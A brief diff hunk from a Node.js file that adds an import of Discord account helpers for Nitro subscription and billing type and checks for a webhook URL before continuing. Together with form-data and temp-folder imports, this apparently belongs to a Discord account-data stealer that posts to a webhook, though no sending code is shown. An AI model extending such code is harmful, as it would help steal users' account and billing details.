@@ -8,8 +8,8 @@ const fs = require('fs');
 const { tempFolder } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
-const moment = require('moment');
 const { userAgent } = require('../config');
+const { nitroSubscriptionType, billingType } = require('../util/discord-account');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
